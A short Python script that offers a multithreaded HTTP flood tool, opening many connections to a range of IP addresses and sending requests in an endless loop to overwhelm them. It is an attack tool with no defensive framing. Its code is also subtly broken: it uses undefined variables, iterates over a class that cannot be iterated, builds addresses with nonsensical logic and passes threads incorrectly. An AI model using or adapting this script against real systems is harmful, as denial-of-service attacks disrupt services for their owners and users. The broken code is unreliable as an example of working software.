import requests
import socket
import sys
from threading import Thread

class IPRange:
    def __init__(self, start, end):
        [start, end] = [int(x) for x in [start, end]]
        self.start = start
        self.end = end

        if start > end:
            raise ValueError('Start IP greater than end IP')

    def __contains__(self, ip):
        ip = int(ip.replace('.', ''))
        return self.start <= ip <= self.end

TARGET_IP = '192.168.1.1'  # Replace with the desired target IP address
TARGET_PORT = 80  # Replace with the desired target port
MAX_CONNECTIONS = 100
TARGET_IP_RANGE = IPRange(int(TARGET_IP.replace('.', '')), int(TARGET_IP.replace('.', ''))+255)
print(f'[+] Target IP: {TARGET_IP}')
class HTTPFlooder(Thread):
    def __init__(self, start_ip, target_host, target_port):
        Thread.__init__(self)
        self.start_ip = start_ip

        self.target_host = target_host
        self.target_port = target_port
    def run(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.connect((self.target_host, self.target_port))

            while True:
                s.sendall(b'GET / HTTP/1.1\r\n\r\n')
                pass

        except Exception as e:
            print(f'[-] Thread[{self.start_ip}] exited: {e}')

        finally:
            s.close()

for ip in TARGET_IP_RANGE:
    try:
        ip = '.'.join(str(x) for x in [int(TARGET_IP[i])+int(i==1)*int(j<i) for i in range(4)] if i > 0)

        if ip in TARGET_IP_RANGE:
            print(f'[+] Flooding IP: {ip}')
            for _ in range(MAX_CONNECTIONS):
                Thread(target=HTTPFlooder(ip, TARGET_HOST, TARGET_PORT + 2)).start()

    except Exception as e:
        continue
